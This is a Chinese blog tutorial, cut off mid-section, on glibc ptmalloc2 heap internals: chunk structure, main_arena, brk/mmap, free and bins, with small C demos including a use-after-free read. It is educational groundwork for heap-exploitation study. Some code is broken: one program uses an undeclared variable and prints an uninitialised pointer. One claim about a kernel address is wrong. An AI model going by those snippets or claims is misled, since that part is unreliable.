只要学过C语言的同学想必都申请过堆内存吧，那么大家是否真正了解申请堆和释放堆后面的机制吗？今天我就带领大家一步一步的来了解，先在这里留一个问题：<code>上述代码是否有漏洞？</code>以后会慢慢的揭开这个答案，本文均是在64位下进行的实验。</p><h3 id="font-color-navy0x00-什么是堆font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-什么是堆font"></a> <font color="navy"><code>0x00 什么是堆？</code></font></h3><blockquote><p>在计算机科学中, 动态内存分配（Dynamic memory allocation）又称为堆内存分配，是指计算机程序在运行期中分配使用内存。它可以当成是一种分配有限内存资源所有权的方法。动态分配的内存在被程序员明确释放或被垃圾回收之前一直有效。与静态内存分配的区别在于没有一个固定的生存期。这样被分配的对象称之为有一个“动态生存期”。对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p></blockquote><p>      简而言之，堆就是程序员动态分配的一个内存空间，它在进程内存中的分布如下：</p><p><img src="/images/136-1.png" alt></p><center><font size="2">图1</font></center><p>      从上图可以看出堆是由<strong>低地址向高地址生长的</strong>，这一点必须要清楚。虽然程序可以请求一块连续内存，并自由地使用，但是还应清楚：<strong>堆在内存空间中不一定连续</strong>。</p><p>      下面我们运行一下上述的代码，在main函数打个断点，当运行完<code>call malloc</code>后，该函数会返回给寄存器<code>eax</code>一个值，这个值就是动态申请的返回的指针<code>ptr</code>。</p><p><img src="/images/136-4.png" alt></p><center><font size="2">图2</font></center><blockquote><p>从上图可以看出返回的地址为<code>0x5555555592a0</code>，对于chunk来说这只是user_content的开始，不是chunk的地址，这块后面会详细讲解。</p></blockquote><p><img src="/images/136-2.png" alt></p><center><font size="2">图3</font></center><blockquote><p>从上图中可以看出，在执行malloc之后在程序的虚拟内存空间中映射了一个heap区域（有关虚拟地址的映射我会在后期在单独写一篇），也就是说这个时候堆已经分配成功了，那么我们计算一下映射的堆的大小是多少：<code>0x000055555557a000- 0x0000555555559000=0x21000（132KB）</code>，下面我们进行验证，看一下堆中的情况，如下图：</p></blockquote><p><img src="/images/136-3.png" alt></p><center><font size="2">图4</font></center><blockquote><p>如上图所示，执行完malloc后会有三个堆块，在这里先不说这些堆块的意义，只是计算一下它们的合计大小：<code>0x290+0x40+0x20d63=0x21000</code>，验证成功。在这里留几个问题：</p><ol><li><font color="green">【图一】返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</font></li><li><font color="green">【图一】我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</font></li><li><font color="green">【图二】我们只申请了大小为50个字节的堆空间，为什么给我们分配了<code>132KB</code>大小的堆空间？</font></li><li><font color="green">【图三】我们只申请了一个堆块，为什么堆空间中有三个堆块？</font></li></ol></blockquote><p>      下面我们还不会讲malloc背后的原理，让我们带着这些问题走进堆的学习。</p><h3 id="font-color-navy0x01-chunk讲解font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-chunk讲解font"></a> <font color="navy"><code>0x01 Chunk讲解</code></font></h3><p>      首先来看chunk的结构，下面给出chunk的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从官方给出的源码中可以看出，chunk有两种结构，分别是<code>malloced chunk</code>和<code>freed chunk</code>，下面根据源码中的数据结构给出两种chunk的结构示意图，在这里给出的是64位下的，对齐字节为16字节。</p></blockquote><p><img src="/images/136-5.png" alt></p><center><font size="2">图5</font></center><blockquote><p>注释：</p><ul><li><code>prev_size</code>：当标志位p=0时，表示前面的chunk处于free状态，这时这里表示的是前一个chunk的大小；当p=1时，表示前面的chunk处于malloc状态，这时这里的数据可以被前面的chunk复用，下面会有例子说明；</li><li><code>size</code>：当前整个chunk的大小</li><li><code>user content</code>：用户申请的大小</li><li><code>A/M/P</code>：标志位<ul><li>A：A=0 为主分区（main_arena）分配，A=1 为非主分区分配</li><li>M：M=0为使用heap区域，M=1表示使用mmap映射区域</li><li>P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效，P=1表示pre_chunk在使用中，prev_size被pre_chunk复用</li></ul></li><li><code>fd</code>：前一个堆块的地址（不是返回给用户的地址哦），只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>bk</code>：后一个堆块的地址，只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>fd_nextsize</code>： <strong>Only used for large blocks: pointer to next larger size</strong></li><li><code>bk_nextsize</code>：<strong>Only used for large blocks: pointer to prev larger size</strong></li></ul></blockquote><p>      有了上述的知识储备，那么我们就可以来回答第一个问题：<code>返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</code>我们从图5中可以看到，我们<strong>申请的堆空间只是user_content部分</strong>，<strong>而chunk真正的起始地址应该是指向prev_size的部分</strong>，所以chunk的起始地址应该为<code>返回给用户的地址-0x10=chunk的起始地址</code>，那么我们也就解决了第1个问题：<code>0x5555555592a0-0x10 = 0x555555559290</code></p><h3 id="font-color-navy0x02-main_arenafont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-main_arenafont"></a> <font color="navy"><code>0x02 main_arena</code></font></h3><p>      这里就是要回答第二个、第三个和第四个问题。在上述例子中，我们申请了50bytes大小的堆，操作系统却给我们申请了132KB大小的堆空间，这是为什么呢？首先在这里先向大家引入一个概念：<code>main_arena</code>，如下图：</p><p><img src="/images/136-6.png" alt></p><center><font size="2">图6</font></center><blockquote><p><code>main_arena</code>是由主线程分配的堆空间，<code>main_arena</code>中含有多个chunk，也就是返回给我们申请的堆的地址。因为132KB远远大于50B，所以如果主线程后续再申请堆空间的话，就会先从这132KB的剩余部分进行申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。<sup>[1]</sup></p></blockquote><p>      通过上述的介绍，我想<strong>第三个问题已经被解决了</strong>，下面开始第二个问题：<code>我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</code>通过上图我们可以看出，我们申请的50B大小的chunk，只是user_content部分的大小，所以真正的chunk大小应该是<code>0x8(prev_size)+0x8(size)+50=66Bytes</code>，但是从第2张图片中我们看到系统却只给我们64KB，这是为什么呢？还记得上一节中讲的chunk的标志位吗？当p=1时，则表示pre_chunk在使用中，prev_size被pre_chunk复用，对！这里就是这个意思，也就是说我们申请的堆块有2字节被放在了next chunk的prev_size字段中，下面我们可以写个程序验证一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      在执行了mecpy函数后，我们看一下堆中的存储情况，因为我们输入的字符串长度为50，正好是我们申请的大小，所以这里没有堆溢出，那么现在预测一下chunk的user_content，应该都是&quot;a&quot;，next_chunk的prev_size部分应该是&quot;b&quot;，如下图：</p><p><img src="/images/136-7.png" alt></p><center><font size="2">图7</font></center><blockquote><p>有关第二个问题，可以这样回答：因为我们申请的是50B大小的chunk，但是实际chunk的大小应该是：<code>用户申请的大小+16+nextchunk可以被复用的部分-prevchunk被复用的部分</code></p></blockquote><p>      下面只有第四个问题没有解决了：<code>我们只申请了一个堆块，为什么堆空间中有三个堆块？</code>在这里需要在main_arena区域中引入两个新的概念：<code>top chunk</code>和（<code>另外一个还没搞明白</code>），如下图：</p><p><img src="/images/136-8.jpg" alt></p><center><font size="2">图8</font></center><blockquote><p>从上图中可以看到，除了用户申请的chunk外的空间，处于高地址部分的为top chunk，该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。<sup>[1]</sup></p></blockquote><h3 id="font-color-navy0x03-malloc机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-malloc机制font"></a> <font color="navy"><code>0x03 malloc机制</code></font></h3><p>      在linux平台malloc本质上都是通过系统调用<strong>brk</strong>或者<strong>mmap</strong>实现的，如下图：</p><p><img src="/images/136-9.png" alt></p><center><font size="2">图9</font></center><blockquote><p>从操作系统角度来看，进程分配内存有两种方式，分别由两个系统调用完成：brk和mmap（不考虑共享内存）。</p><p>1、brk是将数据段(.data)的最高地址指针_edata往高地址推；</p><p>2、mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。</p><pre><code> 这两种方式分配的都是虚拟内存，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。</code></pre><p>在标准C库中，提供了malloc/free函数分配释放内存，这两个函数底层是由brk，mmap，munmap这些系统调用实现的。<sup>[3]</sup></p></blockquote><p><code>brk()函数</code></p><blockquote><p><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L252" target="_blank" rel="noopener">brk</a>通过增加program break的位置（brk）从内核申请（非零值初始化的）内存。一开始，堆段(heap segment)的起始位置（start_brk）和结束位置(brk)指向同一个位置：</p><ul><li>当ASLR（Address Space Layout Randomization）关闭时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（end_data）。</li><li>当ASLR打开时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（<code>end_data</code>）再加上一个随机的brk偏移。</li></ul><p>上面的进程虚拟内存布局图展示了，start_brk是堆段的开始位置，brk(program break)则是堆段的结束位置。</p><p>malloc小于<code>M_MMAP_THRESHOLD</code>（默认为128KB）的内存<sup>[５]</sup>，使用brk分配内存，将_edata往高地址推(只分配虚拟空间，不对应物理内存(因此没有初始化)，第一次读/写数据时，引起内核缺页中断，内核才分配对应的物理内存，然后虚拟地址空间建立映射关系)，如下图：<sup>[4]</sup></p></blockquote><p><img src="/images/136-10.jpg" alt></p><center><font size="2">图10</font></center><blockquote><ol><li><p>进程启动的时候，其（虚拟）内存空间的初始布局如图10-(1)所示。</p><p>其中，mmap内存映射文件是在堆和栈的中间（<a href="http://xn--libc-2-9v9ii49d.2.93.so" target="_blank" rel="noopener">例如libc-2.2.93.so</a>，其它数据文件等），为了简单起见，省略了内存映射文件。_edata指针（glibc里面定义）指向数据段的最高地址。</p></li><li><p>进程调用**A=malloc(30KB)**以后，内存空间如图10-(2)：</p><ul><li><p>malloc函数会调用brk系统调用，将_edata指针往高地址推30K，就完成虚拟内存分配。</p></li><li><p>你可能会问：只要把_edata+30K就完成内存分配了？</p></li><li><p>事实是这样的，_edata+30K只是完成虚拟地址的分配，<strong>A这块内存现在还是没有物理页与之对应的</strong>，等到进程第一次读写A这块内存的时候，<strong>发生缺页中断，内核才分配A这块内存对应的物理页</strong>。也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。</p></li></ul></li><li><p>进程调用B=malloc(40K)以后，内存空间如图10-(3)。</p></li></ol></blockquote><p><code>mmap()函数</code></p><blockquote><p>malloc使用<a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285" target="_blank" rel="noopener">mmap</a>创建一个私有匿名的映射段。这个映射段的主要目的是申请一块（零值初始化的）新内存，这块内存处于栈和堆之间，并且<strong>这块内存只能被调用的这个进程独占使用</strong>。<sup>[4]</sup>当主线程malloc的大小大于128KB时以及子线程在申请动态内存时，会用到mmap来申请。</p></blockquote><p><img src="/images/136-11.png" alt></p><center><font size="2">图11</font></center><blockquote><ol><li><p>进程调用C=malloc(200K)以后，内存空间如图11-(4)：</p><p>默认情况下，malloc函数分配内存，如果请<strong>求内存大于128K</strong>（可由M_MMAP_THRESHOLD选项调节），那就不是去推_edata指针了，而是<strong>利用mmap系统调用，从堆和栈的中间分配一块虚拟内存。</strong></p><p>这样子做主要是因为：<strong>brk分配的内存需要等到高地址内存释放以后才能释放</strong>（例如，在B释放之前，A是不可能释放的，这就是内存碎片产生的原因，什么时候紧缩看下面），而mmap分配的内存可以单独释放。<br>当然，还有其它的好处，也有坏处，再具体下去，有兴趣的同学可以去看glibc里面malloc的代码了。</p></li><li><p>进程调用D=malloc(100K)以后，内存空间如图11-(5)；</p></li><li><p>进程调用<code>free(C)</code>以后，C对应的虚拟内存和物理内存一起释放如图11-(6)。</p></li></ol></blockquote><p><code>总结</code>：</p><ol><li>我们申请动态内存空间，实质上是由brk或mmap函数来完成的</li><li>申请的动态内存空间实质上是Arena区域的一个chunk，并且我们申请的大小只不过是user_content并不是整个chunk的大小</li><li>chunk在使用时和空闲时分别有着对应的状态，两者有着差别</li><li>堆的生长空间是从低地址到高地址</li></ol><h3 id="font-color-navy0x04-free机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-free机制font"></a> <font color="navy"><code>0x04 Free机制</code></font></h3><p>      还记得文章开头的程序代码吗？我问了一个问题：<font color="red"><code>程序代码中有什么问题吗？</code> </font>下面就来看看上述代码有没有问题。给我们申请的内存赋值50个字符串后，我们再调用free函数，这个时候看一下chunk中的情况，如下图：</p><p><img src="/images/136-12.png" alt></p><center><font size="2">图12</font></center><blockquote><p>从图中看到，在free之后，chunk的结构发生了变化，但是除了<code>fd</code>和<code>bk</code>部分的数据改变以外，其他的数据并没有发生改变，那么在free之后我们是否能将剩下的数据打印出来呢？下面写个程序验证一下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">[*] After  free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br></pre></td></tr></table></figure><blockquote><p>可以看出虽然我们free了chunk，但是我们仍然可以通过指针来访问chunk上的数据，所以说在free之后，我们一定要将指针置0，如下程序：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><blockquote><p>可以看出在打印free后的chunk情况时发生了段错误，因为puts中的参数为0x10c，是内核地址，所以不能访问。</p></blockquote><p><font size="5"><strong>敲黑板！敲黑板！敲黑板！</strong></font>这里再提出一个问题：<code>free后的chunk去哪了？我们再次申请同样大小的chunk，会返回什么指针？</code>这里先解决第二个问题：<code>在free chunk后，再次申请同样大小的chunk，这时返回用户的指针是什么呢？</code>下面还是用程序进行验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr0,*ptr1;</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr0,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"   </span></span><br><span class="line"><span class="built_in">free</span>(ptr0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk0:%p\n"</span>,ptr0);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] ptr0 = NULL\n"</span>);</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk1:%p\n"</span>,ptr1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] The address of chunk0:0x5652b84e52a0</span><br><span class="line">[+] ptr0 = NULL</span><br><span class="line">[*] The address of chunk1:0x5652b84e52a0</span><br></pre></td></tr></table></figure><blockquote><p>从上面的结果可以看出我<strong>们第一次和第二次返回的指针相同，也就说明我们两次申请的动态内存空间是同一个空间</strong>，这是什么原因呢？下面就一步一步来解决这个问题：在堆释放后，为了充分利用chunk，系统并不会立即收回chunk，而是把chunk放到一个地方，如果程序中再次申请同样大小的chunk时，会直接将该chunk的地址返回，这里说的地方就是存放空闲chunk的链表结构<code>bins</code>，这里涉及的结构体就是malloc_state，如下是它的源码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从上面的源代码可以看出，bins由两个数组构成分别是：FastbinsY[NFASTBINS]和bins[NBINS * 2 - 2]，通过查阅相关代码，可以知道FastbinsY[]中有一个容器：<code>fastbin</code>，bins[]由三个容器：<code>unsorted bins</code>、<code>small bins</code>和<code>large bins</code>。系统会根据空闲chunk的大小和处于的状态，会将空闲的chunk放在上述4个不同的bins中。注：在libc.2.26以上的动态链接库中又增加了一个<code>Tcache</code>机制，在这里就不展开了。</p></blockquote><h4 id="font-color-blue1fastbinsyfont"><a class="markdownIt-Anchor" href="#font-color-blue1fastbinsyfont"></a> <font color="blue"><code>1.FastbinsY[]</code></font></h4><p><code>fastbins</code></p><p>      该数组主要包含的是<code>fastbins</code>数据结构，它主要用于提高<strong>小内存</strong>的分配效率，默认情况下对于size_sz为4B的平台，小于64B的chunk分配请求；但对于size_ze为8B的平台，小于128B的chunk分配请求，首先会查找fastbins中是否具有所需大小的chunk存在，如果存在则直接返回；</p><p>      我们也可以<strong>把fastbins看作为small bins的一个cache</strong>，默认情况下，对于相同大小的链表上，fastbins只缓存small bins的前7个大小的chunk（Tcache也只缓存fastbins或smallbins的前7个大小的chunk），该结构的特点还有：</p><ol><li>没有bk指针，也就是说它是一个单链表结构</li><li>prev_inuse标志位一定为1，也就是说fastbins chunk不会和其他chunk进行合并</li><li>采用LIFO （先进后出）策略</li></ol><p>      fastbins的结构如下图：</p><p><img src="/images/136-13.png" alt></p><center><font size="2">图13</font></center><h4 id="font-color-blue2binsfont"><a class="markdownIt-Anchor" href="#font-color-blue2binsfont"></a> <font color="blue"><code>2.Bins[]</code></font></h4><p>      该数组中存放的是<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code>，这三个bin均是双链表结构，均可以发生合并，并且一共有126个bins，分别被划分为：</p><ul><li><code>bin[1]</code>：Unsorted bin</li><li><code>bin[2-63]</code>：small bins</li><li><code>bin[64-126]</code>：large bins</li></ul><p>      下图是三个bins的结构图：</p><p><img src="/images/136-15.png" alt></p><center><font size="2">图14</font></center><p><code>Unsorted bins</code></p><p>      Unsorted bins可以看成small bins和large bins的cache，其中只有一个Unsorted bin，并且是以双链表管理空闲的chunk，并且在unsorted bin中的chunk不进行排序，所有的chunk在回收时都要先放到unsorted chunk中（对于高版本的libc，会先放到Tcache中）。那么在分配时，也就是再次申请动态内存时，<strong>如果unsorted 